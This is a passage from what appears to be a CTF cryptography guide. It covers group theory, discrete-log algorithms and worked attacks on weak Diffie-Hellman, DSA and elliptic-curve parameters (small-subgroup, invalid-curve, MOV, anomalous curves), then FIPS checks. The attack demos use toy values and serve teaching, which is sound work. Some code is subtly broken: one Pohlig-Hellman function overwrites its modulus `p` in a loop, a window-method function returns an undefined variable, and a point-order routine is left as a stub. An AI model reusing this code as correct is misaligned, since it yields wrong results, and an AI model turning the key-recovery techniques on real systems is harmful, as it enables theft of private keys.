        # Check if candidate^((2^n-1)/q) ≠ 1 for all prime divisors q
        for q in prime_factors:
            if gf.power(candidate, field_order // q) == 1:
                is_generator = False
                break
        
        if is_generator:
            return candidate
    
    return None

# Find generator in GF(2^4)
n = 4
irreducible = 0b10011  # x^4 + x + 1
gen = find_generator_gf2n(n, irreducible)
print(f"Generator of GF(2^{n}): {bin(gen)}")

# Verify: generate all elements
gf = GF2n(n, irreducible)
if gen:
    elements = set()
    current = 1
    for i in range(2**n - 1):
        elements.add(current)
        current = gf.multiply(current, gen)
    
    print(f"Generated {len(elements)} unique elements")
    print(f"Expected: {2**n - 1}")
```

**CTF Application: Pohlig-Hellman attack on discrete log**

When group order has only small prime factors, can solve discrete log efficiently.

```python
def pohlig_hellman(g, h, p, order_factors):
    """
    Pohlig-Hellman algorithm for discrete logarithm
    
    Given: h = g^x mod p
    Find: x
    
    When order(g) = ∏ p_i^e_i has small prime factors
    """
    from sympy.ntheory.modular import crt
    
    print(f"Group order factors: {order_factors}")
    
    residues = []
    moduli = []
    
    # Solve DLP in each prime power subgroup
    for prime, exponent in order_factors.items():
        prime_power = prime ** exponent
        moduli.append(prime_power)
        
        # Reduce to subgroup of order prime^exponent
        # g' = g^(order/prime^exponent)
        subgroup_order = prime_power
        cofactor = 1
        for p, e in order_factors.items():
            if p != prime:
                cofactor *= p ** e
        
        g_sub = pow(g, cofactor, p)
        h_sub = pow(h, cofactor, p)
        
        # Solve DLP in smaller subgroup (brute force if small)
        x_sub = None
        if prime_power < 100000:
            for x in range(prime_power):
                if pow(g_sub, x, p) == h_sub:
                    x_sub = x
                    break
        
        if x_sub is None:
            print(f"Failed to solve in subgroup of order {prime_power}")
            return None
        
        residues.append(x_sub)
        print(f"  Solved in subgroup order {prime_power}: x ≡ {x_sub}")
    
    # Combine using Chinese Remainder Theorem
    x, _ = crt(moduli, residues)
    return x

# Example: Vulnerable Diffie-Hellman with smooth order
from sympy import factorint

p = 1009  # Prime
# p-1 = 1008 = 2^4 × 3^2 × 7 (smooth)
order_factors = factorint(p - 1)

g = 11  # Generator
x_secret = 123  # Secret exponent
h = pow(g, x_secret, p)  # Public value

# Attack
x_recovered = pohlig_hellman(g, h, p, order_factors)
print(f"\nSecret: {x_secret}")
print(f"Recovered: {x_recovered}")
print(f"Match: {x_recovered % (p-1) == x_secret % (p-1)}")
```

**Baby-step Giant-step (BSGS) for larger subgroups:**

```python
def baby_step_giant_step(g, h, p, order):
    """
    Baby-step Giant-step algorithm for discrete logarithm
    Complexity: O(√order) time and space
    
    Find x such that g^x ≡ h (mod p) where 0 ≤ x < order
    """
    import math
    
    m = math.ceil(math.sqrt(order))
    
    # Baby step: compute table of g^j for j = 0, 1, ..., m-1
    table = {}
    g_power = 1
    
    for j in range(m):
        if g_power not in table:
            table[g_power] = j
        g_power = (g_power * g) % p
    
    # Giant step: compute g^(-m)
    g_inv_m = pow(g, -m, p)
    
    # Search for collision
    gamma = h
    for i in range(m):
        if gamma in table:
            j = table[gamma]
            x = (i * m + j) % order
            return x
        
        gamma = (gamma * g_inv_m) % p
    
    return None

# Example usage
p = 1000003
g = 2
x = 123456
h = pow(g, x, p)

x_found = baby_step_giant_step(g, h, p, p - 1)
print(f"BSGS result: x = {x_found}")
print(f"Verification: {pow(g, x_found, p) == h}")
```

---

### Order & Subgroups

**Lagrange's Theorem:** The order of any subgroup divides the order of the group.

**Corollary:** The order of any element divides the group order.

```python
def verify_lagrange(p):
    """
    Verify Lagrange's theorem for (Z/pZ)*
    All element orders divide p-1
    """
    from sympy import divisors
    
    group_order = p - 1
    valid_orders = divisors(group_order)
    
    print(f"Group order: {group_order}")
    print(f"Valid element orders (divisors): {valid_orders}")
    
    # Check all elements
    order_counts = {}
    
    for g in range(1, p):
        order = element_order_fast(g, p)
        
        if order not in order_counts:
            order_counts[order] = 0
        order_counts[order] += 1
        
        # Verify Lagrange
        assert group_order % order == 0, f"Order {order} doesn't divide {group_order}"
    
    print("\nOrder distribution:")
    for order in sorted(order_counts.keys()):
        count = order_counts[order]
        print(f"  Order {order}: {count} elements")

# Example
verify_lagrange(13)
```

**Subgroup structure:**

```python
def find_subgroups(p):
    """
    Find all subgroups of (Z/pZ)*
    Each divisor d of p-1 corresponds to unique subgroup of order d
    """
    from sympy import divisors
    
    group_order = p - 1
    subgroup_orders = divisors(group_order)
    
    subgroups = {}
    
    for order in subgroup_orders:
        # Find element of this order
        for g in range(2, p):
            if element_order_fast(g, p) == order:
                # Generate subgroup
                subgroup = set()
                current = 1
                for _ in range(order):
                    subgroup.add(current)
                    current = (current * g) % p
                
                subgroups[order] = sorted(subgroup)
                break
    
    return subgroups

# Example: subgroups of (Z/11Z)*
p = 11
subgroups = find_subgroups(p)

print(f"Subgroups of (Z/{p}Z)*:")
for order, elements in subgroups.items():
    print(f"  Order {order}: {elements}")
```

**Euler's theorem application:**

For any `a` coprime to `n`: `a^φ(n) ≡ 1 (mod n)`

```python
def verify_euler_theorem(n, trials=100):
    """Verify Euler's theorem: a^φ(n) ≡ 1 (mod n)"""
    phi_n = euler_totient(n)
    
    print(f"n = {n}, φ(n) = {phi_n}")
    
    from math import gcd
    import random
    
    for _ in range(trials):
        a = random.randint(2, n - 1)
        
        if gcd(a, n) == 1:
            result = pow(a, phi_n, n)
            assert result == 1, f"Euler's theorem failed for a={a}"
    
    print(f"✓ Verified Euler's theorem for {trials} random values")

verify_euler_theorem(100)
```

**Fermat's Little Theorem (special case for primes):**

For prime `p` and `a` not divisible by `p`: `a^(p-1) ≡ 1 (mod p)`

```python
def fermat_primality_test(n, trials=20):
    """
    Probabilistic primality test using Fermat's Little Theorem
    
    [Inference] Not foolproof - Carmichael numbers pass test but are composite
    """
    import random
    from math import gcd
    
    if n < 2:
        return False
    if n == 2 or n == 3:
        return True
    if n % 2 == 0:
        return False
    
    for _ in range(trials):
        a = random.randint(2, n - 2)
        
        if gcd(a, n) != 1:
            return False
        
        # Check if a^(n-1) ≡ 1 (mod n)
        if pow(a, n - 1, n) != 1:
            return False  # Definitely composite
    
    return True  # Probably prime

# Test
print(f"561 prime? {fermat_primality_test(561)}")  # Carmichael number - fails
print(f"563 prime? {fermat_primality_test(563)}")  # Actually prime

# Carmichael numbers fool Fermat test
carmichael_numbers = [561, 1105, 1729, 2465, 2821, 6601]
for n in carmichael_numbers:
    print(f"{n}: Fermat says {'prime' if fermat_primality_test(n) else 'composite'}")
```

---

**CTF Application: Small subgroup attack on Diffie-Hellman**

```python
def small_subgroup_attack_dh():
    """
    Attack Diffie-Hellman when parameters allow small subgroups
    
    Scenario: Server accepts any g from client
    Attacker sends g of small order
    """
    
    # Legitimate DH parameters
    p = 1009  # Prime
    # p-1 = 1008 = 2^4 × 3^2 × 7
    
    # Attacker finds element of small order
    def find_small_order_element(p, target_order):
        """Find element with specific order"""
        from sympy import divisors
        
        for g in range(2, p):
            if element_order_fast(g, p) == target_order:
                return g
        return None
    
    # Attack: Use generator of order 7
    small_order = 7
    g_malicious = find_small_order_element(p, small_order)
    
    print(f"Malicious generator: {g_malicious} (order {small_order})")
    
    # Server computes: public_key = g^secret mod p
    # But now public_key has only 7 possible values!
    
    server_secret = 42  # Unknown to attacker
    server_public = pow(g_malicious, server_secret, p)
    
    print(f"Server public key: {server_public}")
    
    # Attacker brute-forces small subgroup
    print("Attacker tries all possibilities:")
    for guess in range(small_order):
        if pow(g_malicious, guess, p) == server_public:
            print(f"  Found: secret ≡ {guess} (mod {small_order})")
            
            # Attacker learns: server_secret ≡ guess (mod small_order)
            # With multiple subgroups, can use CRT to recover full secret
            recovered_mod = server_secret % small_order
            print(f"  Verification: {server_secret} ≡ {recovered_mod} (mod {small_order})")
            break

small_subgroup_attack_dh()
```

**Full small subgroup attack with CRT:**

```python
def full_small_subgroup_attack(p, server_secret):
    """
    Complete small subgroup attack using multiple subgroups
    Recovers secret using Chinese Remainder Theorem
    """
    from sympy import factorint, divisors
    from sympy.ntheory.modular import crt
    
    # Factor p-1
    order = p - 1
    factors = factorint(order)
    
    print(f"p-1 = {order}")
    print(f"Factors: {factors}")
    
    # Collect information from each small prime order subgroup
    moduli = []
    residues = []
    
    for prime, exponent in factors.items():
        subgroup_order = prime ** exponent
        
        if subgroup_order > 100000:
            print(f"Skipping large subgroup of order {subgroup_order}")
            continue
        
        # Find generator of this subgroup
        g_sub = None
        for g in range(2, p):
            if element_order_fast(g, p) == subgroup_order:
                g_sub = g
                break
        
        if g_sub is None:
            continue
        
        # Server's public key in this subgroup
        public_sub = pow(g_sub, server_secret, p)
        
        # Brute-force in small subgroup
        for x in range(subgroup_order):
            if pow(g_sub, x, p) == public_sub:
                moduli.append(subgroup_order)
                residues.append(x)
                print(f"Subgroup order {subgroup_order}: secret ≡ {x}")
                break
    
    # Combine using CRT
    if len(moduli) > 0:
        recovered, _ = crt(moduli, residues)
        
        # Compute product of moduli
        import math
        total_modulus = math.prod(moduli)
        
        print(f"\nRecovered: {recovered} (mod {total_modulus})")
        print(f"Actual secret: {server_secret}")
        print(f"Match: {recovered % total_modulus == server_secret % total_modulus}")
        
        return recovered
    
    return None

# Attack scenario
p = 1009
server_secret = 12345 % (p - 1)  # Some secret exponent

recovered = full_small_subgroup_attack(p, server_secret)
```

---

**Cyclic groups and order:**

```python
class CyclicGroup:
    """Representation of cyclic group generated by element g"""
    
    def __init__(self, g, p):
        """
        Create cyclic group <g> in (Z/pZ)*
        <g> = {1, g, g^2, g^3, ..., g^(order-1)}
        """
        self.g = g
        self.p = p
        self.order = element_order_fast(g, p)
        
        # Generate all elements
        self.elements = []
        current = 1
        for _ in range(self.order):
            self.elements.append(current)
            current = (current * g) % p
        
        self.elements.sort()
    
    def contains(self, h):
        """Check if h is in cyclic group"""
        return h in self.elements
    
    def discrete_log(self, h):
        """Find x such that g^x = h (if h in group)"""
        if h not in self.elements:
            return None
        
        current = 1
        for x in range(self.order):
            if current == h:
                return x
            current = (current * self.g) % self.p
        
        return None
    
    def is_subgroup_of(self, other):
        """Check if this is subgroup of another cyclic group"""
        return all(other.contains(elem) for elem in self.elements)

# Example: Subgroup structure
p = 13
G = CyclicGroup(2, p)  # Generator of full group
H = CyclicGroup(3, p)  # Subgroup

print(f"Group <2> mod 13: {G.elements}")
print(f"Order: {G.order}")
print(f"\nSubgroup <3> mod 13: {H.elements}")
print(f"Order: {H.order}")
print(f"\n<3> ⊆ <2>: {H.is_subgroup_of(G)}")
```

**Coset decomposition:**

```python
def coset_decomposition(G, H):
    """
    Decompose group G into cosets of subgroup H
    G = H ∪ g₁H ∪ g₂H ∪ ...
    """
    cosets = []
    uncovered = set(G.elements)
    
    # H itself is a coset
    cosets.append(sorted(H.elements))
    uncovered -= set(H.elements)
    
    # Find other cosets
    while uncovered:
        # Pick representative
        g = min(uncovered)
        
        # Compute coset gH
        coset = []
        for h in H.elements:
            elem = (g * h) % G.p
            coset.append(elem)
            uncovered.discard(elem)
        
        cosets.append(sorted(coset))
    
    return cosets

# Example
p = 13
G = CyclicGroup(2, p)  # Order 12
H = CyclicGroup(5, p)  # Order 4

cosets = coset_decomposition(G, H)
print(f"Coset decomposition of <2> by <5> mod 13:")
for i, coset in enumerate(cosets):
    print(f"  Coset {i}: {coset}")
```

---

**CTF Application: Weak DSA signature recovery**

DSA uses subgroup of prime order `q` within `(Z/pZ)*`.

```python
def dsa_subgroup_attack():
    """
    Attack weak DSA parameters where subgroup order is small
    """
    from hashlib import sha256
    
    # Weak DSA parameters
    p = 1009  # Prime modulus
    q = 7     # Subgroup order (WEAK - should be ~256 bits)
    
    # Find generator of subgroup order q
    g = None
    for candidate in range(2, p):
        if pow(candidate, q, p) == 1 and candidate != 1:
            # Check it's not 1 and has order dividing q
            order = element_order_fast(candidate, p)
            if order == q:
                g = candidate
                break
    
    print(f"DSA parameters: p={p}, q={q}, g={g}")
    
    # Key generation
    import random
    x = random.randint(1, q - 1)  # Private key
    y = pow(g, x, p)              # Public key
    
    print(f"Public key: {y}")
    
    # Signing
    message = b"test message"
    h = int.from_bytes(sha256(message).digest(), 'big') % q
    
    k = random.randint(1, q - 1)  # Nonce
    r = pow(g, k, p) % q
    k_inv = pow(k, -1, q)
    s = (k_inv * (h + x * r)) % q
    
    signature = (r, s)
    print(f"Signature: r={r}, s={s}")
    
    # Attack: Recover private key by brute-forcing small subgroup
    print("\nAttacker brute-forces small subgroup:")
    
    for x_guess in range(1, q):
        y_guess = pow(g, x_guess, p)
        
        if y_guess == y:
            print(f"Private key recovered: {x_guess}")
            print(f"Actual private key: {x}")
            print(f"Match: {x_guess == x}")
            break

dsa_subgroup_attack()
```

**Order computation for elliptic curves (preview):**

```python
def ec_point_order_naive(point, curve_order):
    """
    Compute order of point on elliptic curve (naive method)
    
    [Inference] For real ECC, use Schoof's algorithm or SEA
    This is simplified for educational purposes
    """
    from sympy import divisors
    
    # Order divides curve order (Lagrange)
    possible_orders = divisors(curve_order)
    
    for order in possible_orders:
        # Check if order * point = infinity
        # (Simplified - actual EC arithmetic omitted)
        pass
    
    # [Unverified] Full ECC implementation needs proper point operations
    return None
```

---

**Sylow theorems application:**

Sylow theorems describe subgroup structure for prime power orders.

```python
def sylow_subgroups(p, group_order):
    """
    Find Sylow p-subgroups (subgroups of order p^k)
    where p^k is highest power of p dividing group_order
    """
    from sympy import factorint
    
    factors = factorint(group_order)
    
    if p not in factors:
        print(f"No Sylow {p}-subgroups (p doesn't divide order)")
        return []
    
    k = factors[p]
    sylow_order = p ** k
    
    print(f"Sylow {p}-subgroups have order {sylow_order}")
    
    # Number of Sylow p-subgroups: 1 + kp for some k, and divides group_order
    # [Inference] Exact count requires more group theory
    
    return sylow_order

# Example
group_order = 72  # 2^3 × 3^2
sylow_subgroups(2, group_order)  # Order 8
sylow_subgroups(3, group_order)  # Order 9
```

---

**Summary table of important orders:**

```python
def generate_order_summary(p):
    """Generate comprehensive order analysis for (Z/pZ)*"""
    from sympy import factorint, divisors
    from collections import Counter
    
    print(f"=== Order Analysis for (Z/{p}Z)* ===\n")
    
    group_order = p - 1
    print(f"Group order: {group_order}")
    print(f"Factorization: {factorint(group_order)}\n")
    
    # Count elements by order
    order_distribution = Counter()
    generators = []
    
    for g in range(1, p):
        order = element_order_fast(g, p)
        order_distribution[order] += 1
        
        if order == group_order:
            generators.append(g)
    
    print("Order distribution:")
    for order in sorted(order_distribution.keys()):
        count = order_distribution[order]
        percentage = (count / (p - 1)) * 100
        print(f"  Order {order:4d}: {count:4d} elements ({percentage:5.1f}%)")
    
    print(f"\nNumber of generators: {len(generators)}")
    print(f"Generators: {generators[:10]}{'...' if len(generators) > 10 else ''}")
    
    # Subgroup structure
    print(f"\nSubgroup orders (divisors of {group_order}):")
    for d in sorted(divisors(group_order)):
        print(f"  {d}")

# Example analysis
generate_order_summary(23)
```

---

**Important Related Topics**

For comprehensive understanding of group theory and finite fields in cryptographic CTF challenges:

- **Elliptic Curve Groups**: Point addition, order computation, Hasse's theorem
- **Quadratic Residues**: Legendre and Jacobi symbols, quadratic reciprocity
- **Index Calculus**: Advanced discrete logarithm algorithm for specific groups
- **Pairing-based cryptography**: Bilinear maps on elliptic curves (Weil, Tate pairings)
- **Lattice-based algebra**: Module structures, ideal lattices for post-quantum cryptography

---

## Elliptic Curves

Elliptic curve cryptography (ECC) forms the mathematical foundation for numerous modern cryptographic systems including ECDSA, ECDH, and EdDSA. Understanding curve mathematics is essential for exploiting implementation flaws, parameter manipulation, and solving curve-based CTF challenges.

### Curve Equations (Weierstrass, Montgomery)

**Weierstrass Form** is the most common representation of elliptic curves:

```
y² = x³ + ax + b (mod p)
```

The curve must satisfy the non-singularity condition: `4a³ + 27b² ≠ 0 (mod p)`. This ensures no cusps or self-intersections exist.

**Standard curves in Weierstrass form:**

- **secp256k1** (Bitcoin): `y² = x³ + 7 (mod p)` where `a=0, b=7`
- **P-256/secp256r1** (NIST): `y² = x³ - 3x + b (mod p)` where `a=-3`

**SageMath implementation for Weierstrass curves:**

```python
# Define finite field
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
Fp = GF(p)

# secp256k1 parameters
a = Fp(0)
b = Fp(7)
E = EllipticCurve(Fp, [a, b])

# Verify point on curve
x = Fp(0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798)
y = Fp(0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)
P = E(x, y)
print(f"Point valid: {P in E}")
```

**Montgomery Form** provides computational efficiency for scalar multiplication:

```
By² = x³ + Ax² + x (mod p)
```

**Key Montgomery curves:**

- **Curve25519**: `y² = x³ + 486662x² + x (mod 2²⁵⁵ - 19)`
- **Curve448**: `y² = x³ + 156326x² + x (mod 2⁴⁴⁸ - 2²²⁴ - 1)`

Montgomery curves enable the **Montgomery ladder** algorithm, which computes scalar multiplication using only x-coordinates, providing natural resistance to timing attacks.

**Conversion between forms:**

```python
# Weierstrass to Montgomery (when possible)
# Given y² = x³ + ax + b
# Convert to By² = x³ + Ax² + x
# Requires 3-torsion point analysis

# Using SageMath
E_weier = EllipticCurve(GF(p), [a, b])
try:
    E_mont = E_weier.montgomery_model()
    print(f"Montgomery A: {E_mont.a_invariants()[0]}")
except ValueError:
    print("No Montgomery form exists")
```

**CTF exploitation vectors:**

- **Singular curves**: If `4a³ + 27b² ≡ 0`, the curve is weak and reducible to additive group
- **Small subgroup attacks**: Check if curve order is smooth (many small factors)
- **Invalid curve attacks**: Submit points on different curves with same parameters but modified `a` or `b`

### Point Operations

Elliptic curve points form an abelian group under addition. The **point at infinity** (𝒪) serves as the identity element.

**Point Addition (P + Q where P ≠ Q, P ≠ -Q):**

Given P = (x₁, y₁) and Q = (x₂, y₂):

```
λ = (y₂ - y₁) / (x₂ - x₁) mod p
x₃ = λ² - x₁ - x₂ mod p
y₃ = λ(x₁ - x₃) - y₁ mod p
Result: R = (x₃, y₃)
```

**Point Doubling (P + P = 2P):**

```
λ = (3x₁² + a) / (2y₁) mod p
x₃ = λ² - 2x₁ mod p
y₃ = λ(x₁ - x₃) - y₁ mod p
```

**Point Negation:**

```
-P = (x₁, -y₁ mod p)
P + (-P) = 𝒪
```

**SageMath point operations:**

```python
# Define curve and points
E = EllipticCurve(GF(p), [a, b])
P = E(x1, y1)
Q = E(x2, y2)

# Operations
R = P + Q          # Point addition
S = 2 * P          # Point doubling
T = 5 * P          # Scalar multiplication
neg_P = -P         # Point negation
identity = P - P   # Returns point at infinity

# Verify group properties
assert P + Q == Q + P              # Commutativity
assert (P + Q) + R == P + (Q + R)  # Associativity
assert P + E(0) == P               # Identity
```

**Implementation in Python (without SageMath):**

```python
def modinv(a, m):
    """Extended Euclidean algorithm for modular inverse"""
    def egcd(a, b):
        if a == 0:
            return b, 0, 1
        gcd, x1, y1 = egcd(b % a, a)
        x = y1 - (b // a) * x1
        y = x1
        return gcd, x, y
    
    gcd, x, _ = egcd(a % m, m)
    return (x % m + m) % m if gcd == 1 else None

def point_add(P, Q, a, p):
    """Add two points on elliptic curve y² = x³ + ax + b (mod p)"""
    if P is None:  # Point at infinity
        return Q
    if Q is None:
        return P
    
    x1, y1 = P
    x2, y2 = Q
    
    # Check if points are negatives
    if x1 == x2 and (y1 + y2) % p == 0:
        return None  # Point at infinity
    
    # Point doubling
    if P == Q:
        if y1 == 0:
            return None
        lam = (3 * x1 * x1 + a) * modinv(2 * y1, p) % p
    # Point addition
    else:
        if x1 == x2:
            return None
        lam = (y2 - y1) * modinv(x2 - x1, p) % p
    
    x3 = (lam * lam - x1 - x2) % p
    y3 = (lam * (x1 - x3) - y1) % p
    
    return (x3, y3)

# Example usage
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
a = 0
P = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
     0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)
Q = point_add(P, P, a, p)
print(f"2P = {Q}")
```

**CTF exploitation scenarios:**

- **Missing point validation**: Server doesn't verify point is on curve before operations
- **Incomplete formula attacks**: Implementation doesn't handle edge cases (doubling, identity, negation)
- **Fault attacks**: Induce errors during point operations to leak information

### Scalar Multiplication

Scalar multiplication computes `kP = P + P + ... + P` (k times). This is the fundamental operation in ECC cryptography and the computational basis for trapdoor functions.

**Binary Method (Double-and-Add):**

```python
def scalar_mult(k, P, a, p):
    """Compute k*P using binary method"""
    if k == 0:
        return None  # Point at infinity
    if k == 1:
        return P
    
    result = None
    addend = P
    
    while k:
        if k & 1:  # If bit is 1
            result = point_add(result, addend, a, p)
        addend = point_add(addend, addend, a, p)  # Double
        k >>= 1
    
    return result

# Example
k = 0xAA5E28D6A97A2479A65527F7290311A3624D4CC0FA1578598EE3C2613BF99522
kP = scalar_mult(k, P, a, p)
```

**Montgomery Ladder** (constant-time, side-channel resistant):

```python
def montgomery_ladder(k, P, a, p):
    """Constant-time scalar multiplication"""
    R0 = None  # Point at infinity
    R1 = P
    
    # Process bits from MSB to LSB
    for bit in bin(k)[2:]:
        if bit == '0':
            R1 = point_add(R0, R1, a, p)
            R0 = point_add(R0, R0, a, p)
        else:
            R0 = point_add(R0, R1, a, p)
            R1 = point_add(R1, R1, a, p)
    
    return R0
```

**Window Methods (faster but not constant-time):**

```python
def window_scalar_mult(k, P, a, p, w=4):
    """NAF window method for faster computation"""
    # Precompute [P, 3P, 5P, ..., (2^w-1)P]
    precomp = [None] * (2**(w-1))
    precomp[0] = P
    double_P = point_add(P, P, a, p)
    
    for i in range(1, 2**(w-1)):
        precomp[i] = point_add(precomp[i-1], double_P, a, p)
    
    # Convert k to NAF representation
    # [Implementation details omitted for brevity]
    # Process NAF representation using precomputed points
    
    return result  # [Inference: specific implementation varies]
```

**SageMath optimized operations:**

```python
# SageMath handles optimization internally
P = E.random_point()
k = randint(1, E.order())

# Fast scalar multiplication (uses optimized algorithms)
Q = k * P

# Timing comparison
import time
t1 = time.time()
for _ in range(1000):
    _ = k * P
t2 = time.time()
print(f"1000 multiplications: {t2-t1:.4f}s")
```

**CTF attacks on scalar multiplication:**

1. **Timing attacks**: If implementation isn't constant-time, measure execution time to leak bit values
2. **Power analysis**: Monitor power consumption during scalar mult to recover bits
3. **Lattice attacks on nonces**: If scalar k is biased or partially leaked, use LLL to recover private key
4. **Invalid point attacks**: Use point not on curve to leak information about scalar

**Tools for scalar multiplication analysis:**

```bash
# Using ectools (if available in CTF environment)
# [Unverified: tool availability varies by CTF]

# Python analysis
python3 << 'EOF'
from Crypto.Util.number import *
import time

# Measure timing for different scalar values
def measure_timing(k, P, trials=100):
    times = []
    for _ in range(trials):
        start = time.perf_counter()
        result = scalar_mult(k, P, a, p)
        times.append(time.perf_counter() - start)
    return sum(times) / len(times)

# Test scalars with different Hamming weights
for hw in [64, 128, 192, 256]:
    k = (1 << hw) - 1  # All 1s up to hw bits
    avg_time = measure_timing(k, P)
    print(f"Hamming weight {hw}: {avg_time:.6f}s")
EOF
```

### Order of Curve

The **order of a curve** n is the number of points on the curve including the point at infinity. The **order of a point** P is the smallest positive integer k such that kP = 𝒪.

**Hasse's Theorem** bounds the curve order:

```
|n - (p + 1)| ≤ 2√p
```

For a curve over GF(p), the order is approximately p, typically within ±2√p.

**Computing curve order with SageMath:**

```python
# Define curve
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
E = EllipticCurve(GF(p), [0, 7])

# Get order
n = E.order()
print(f"Curve order: {n}")
print(f"Order in hex: {hex(n)}")

# Factor the order
print(f"Factorization: {factor(n)}")

# For secp256k1:
# n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
# This is prime
```

**Point order determination:**

```python
# Get order of specific point
P = E.random_point()
point_order = P.order()
print(f"Point order: {point_order}")

# Verify point order divides curve order
assert n % point_order == 0

# Generator point order
G = E.gen(0)  # Standard generator
print(f"Generator order: {G.order()}")
print(f"Is generator: {G.order() == n}")
```

**Schoof's Algorithm** (for computing order efficiently):

```bash
# SageMath uses optimized Schoof-Elkies-Atkin algorithm
# For CTF, usually use built-in functions

sage << 'EOF'
p = random_prime(2^256)
a = GF(p).random_element()
b = GF(p).random_element()

# Ensure non-singular
while (4*a^3 + 27*b^2) == 0:
    b = GF(p).random_element()

E = EllipticCurve(GF(p), [a, b])
n = E.order()  # Uses Schoof-Elkies-Atkin
print(f"Order: {n}")
print(f"Time complexity: O(log^8 p)")  # [Inference: theoretical complexity]
EOF
```

**Subgroup analysis:**

```python
# Find all subgroups
n = E.order()
factors = factor(n)

print(f"Curve order factorization: {factors}")

# For each prime factor, find points of that order
for prime, exp in factors:
    subgroup_order = prime^exp
    cofactor = n // subgroup_order
    
    # Generate point in subgroup
    P = E.random_point()
    Q = cofactor * P
    
    print(f"Subgroup order {subgroup_order}: {Q.order() == subgroup_order}")
```

**CTF exploitation based on curve order:**

1. **Small subgroup attacks**: If curve order is smooth (product of small primes), use Pohlig-Hellman algorithm to solve ECDLP

```python
# Pohlig-Hellman for smooth order
def pohlig_hellman(P, Q, n, factors):
    """Solve Q = kP when n is smooth"""
    from sage.groups.generic import bsgs
    
    dlogs = []
    moduli = []
    
    for prime, exp in factors:
        subgroup_order = prime^exp
        cofactor = n // subgroup_order
        
        # Reduce to subgroup
        P_sub = cofactor * P
        Q_sub = cofactor * Q
        
        # Solve in small subgroup (BSGS)
        dlog = bsgs(P_sub, Q_sub, bounds=(0, subgroup_order))
        dlogs.append(dlog)
        moduli.append(subgroup_order)
    
    # Chinese Remainder Theorem
    k = crt(dlogs, moduli)
    return k
```

2. **Invalid curve attacks**: Construct curves with different orders containing smooth subgroups

```python
# Generate invalid curves with smooth order
def find_smooth_order_curve(p, a_orig, b_orig, smoothness_bound):
    """Find curve with similar parameters but smooth order"""
    for b_offset in range(-1000, 1000):
        b_test = (b_orig + b_offset) % p
        
        # Check non-singularity
        if (4*a_orig^3 + 27*b_test^2) % p == 0:
            continue
        
        E_test = EllipticCurve(GF(p), [a_orig, b_test])
        n_test = E_test.order()
        
        # Check if order is smooth
        if max(factor(n_test)) < smoothness_bound:
            return E_test, n_test
    
    return None, None
```

3. **MOV attack**: Transfer ECDLP to finite field DLP using Weil pairing (when embedding degree is small)

```python
# Check embedding degree
def embedding_degree(E, n, max_k=100):
    """Find smallest k where n | p^k - 1"""
    p = E.base_field().order()
    for k in range(1, max_k):
        if (p^k - 1) % n == 0:
            return k
    return None

k = embedding_degree(E, n)
if k and k < 20:  # Small embedding degree
    print(f"Warning: MOV attack applicable with k={k}")
```

4. **Anomalous curves**: When n = p (trace of Frobenius = 1), ECDLP reducible to additive group

```python
# Detect anomalous curve
if E.order() == p:
    print("Anomalous curve detected - use Smart's attack")
    # Smart's attack implementation available in SageMath
```

**Practical order verification in CTF:**

```bash
# Quick check if curve order is provided
python3 << 'EOF'
n_claimed = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# Verify using Hasse bound
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
lower = p + 1 - 2*int(p**0.5)
upper = p + 1 + 2*int(p**0.5)

if lower <= n_claimed <= upper:
    print("Order consistent with Hasse bound")
    
# Check factorization
from Crypto.Util.number import *
print(f"Is prime: {isPrime(n_claimed)}")
EOF
```

**Tools for curve order analysis:**

- **SageMath**: `E.order()`, `factor()`, built-in Pohlig-Hellman
- **Pari/GP**: `ellcard()`, `ellgroup()` for order and group structure
- **Custom scripts**: Implement baby-step giant-step for small orders

---

# DOCUMENTATION & REFERENCE

## Standards

### FIPS (Federal Information Processing Standards)

FIPS are publicly announced standards developed by the U.S. National Institute of Standards and Technology (NIST) for use in computer systems by non-military government agencies and contractors. In CTF contexts, understanding FIPS helps identify cryptographic implementations, their constraints, and potential weaknesses.

**Key FIPS Standards for CTF:**

**FIPS 140-2/140-3 - Security Requirements for Cryptographic Modules**

- Defines four security levels (Level 1-4) for cryptographic module validation
- CTF relevance: Implementations claiming FIPS compliance may have specific operational constraints
- Testing for FIPS mode on Linux systems:

```bash
# Check if OpenSSL is in FIPS mode
openssl md5 /dev/null  # Will fail if FIPS mode enabled
cat /proc/sys/crypto/fips_enabled  # Returns 1 if enabled

# Check system-wide FIPS status
fips-mode-setup --check

# Examine cryptographic module configuration
ls -la /etc/system-fips
```

**FIPS 180-4 - Secure Hash Standard (SHS)**

- Specifies SHA-1, SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, SHA-512/256
- CTF exploitation: SHA-1 is deprecated but still found in legacy systems (collision attacks available)
- Verification commands:

```bash
# Generate hashes with different algorithms
echo -n "data" | openssl dgst -sha1
echo -n "data" | openssl dgst -sha256
echo -n "data" | sha1sum
echo -n "data" | sha256sum

# Compare hash outputs for algorithm identification
hashid <hash_value>
hash-identifier
```

**FIPS 186-4 - Digital Signature Standard (DSS)**

- Covers DSA, RSA, and ECDSA signature algorithms
- Key sizes and parameter requirements specified
- CTF testing for DSA parameters:

```bash
# Extract DSA parameters from keys
openssl dsa -in dsa_key.pem -text -noout

# Verify signature with specific algorithm
openssl dgst -sha256 -verify pubkey.pem -signature sig.bin file.txt
```

**FIPS 197 - Advanced Encryption Standard (AES)**

- Specifies AES with 128, 192, and 256-bit keys
- Block size fixed at 128 bits
- Common CTF scenarios involve mode misuse (ECB patterns, IV reuse in CBC/CTR)

```bash
# AES encryption/decryption
